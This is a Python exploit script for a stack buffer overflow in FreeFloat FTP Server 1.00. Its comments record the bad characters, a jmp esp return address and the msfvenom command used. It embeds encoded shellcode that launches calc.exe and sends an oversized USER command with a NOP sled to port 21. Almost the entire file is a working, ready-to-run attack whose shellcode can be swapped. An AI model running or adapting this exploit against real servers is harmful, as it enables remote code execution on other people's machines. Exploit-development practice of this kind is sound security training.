#!/usr/bin/env python

import socket

#
# FreeFloat Ftp Server (Version 1.00)
# bad characters: \x00\x0a\x0d
# 0x77559c77 : jmp esp |  ole32.dll
# msfvenom -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -i 1 -f c
# Tested On: Windows XP SP3 using Immunity dbg and mona.py plugin
#

shellcode=(
        "\xbe\x9a\x1b\x73\xd1\xdd\xc0\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
        "\x31\x83\xe8\xfc\x31\x70\x0f\x03\x70\x95\xf9\x86\x2d\x41\x7f"
        "\x68\xce\x91\xe0\xe0\x2b\xa0\x20\x96\x38\x92\x90\xdc\x6d\x1e"
        "\x5a\xb0\x85\x95\x2e\x1d\xa9\x1e\x84\x7b\x84\x9f\xb5\xb8\x87"
        "\x23\xc4\xec\x67\x1a\x07\xe1\x66\x5b\x7a\x08\x3a\x34\xf0\xbf"
        "\xab\x31\x4c\x7c\x47\x09\x40\x04\xb4\xd9\x63\x25\x6b\x52\x3a"
        "\xe5\x8d\xb7\x36\xac\x95\xd4\x73\x66\x2d\x2e\x0f\x79\xe7\x7f"
        "\xf0\xd6\xc6\xb0\x03\x26\x0e\x76\xfc\x5d\x66\x85\x81\x65\xbd"
        "\xf4\x5d\xe3\x26\x5e\x15\x53\x83\x5f\xfa\x02\x40\x53\xb7\x41"
        "\x0e\x77\x46\x85\x24\x83\xc3\x28\xeb\x02\x97\x0e\x2f\x4f\x43"
        "\x2e\x76\x35\x22\x4f\x68\x96\x9b\xf5\xe2\x3a\xcf\x87\xa8\x50"
        "\x0e\x15\xd7\x16\x10\x25\xd8\x06\x79\x14\x53\xc9\xfe\xa9\xb6"
        "\xae\xf1\xe3\x9b\x86\x99\xad\x49\x9b\xc7\x4d\xa4\xdf\xf1\xcd"
        "\x4d\x9f\x05\xcd\x27\x9a\x42\x49\xdb\xd6\xdb\x3c\xdb\x45\xdb"
        "\x14\xb8\x08\x4f\xf4\x11\xaf\xf7\x9f\x6d"
        )

payload = "USER " + "A"*230 +"\x77\x9c\x55\x77" + "\x90"*20 + shellcode + "\r\n"

ip=''
port=21

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print s.recv(1024)
    s.send(payload)
    s.close()
except:
    print "Couldn't connect"

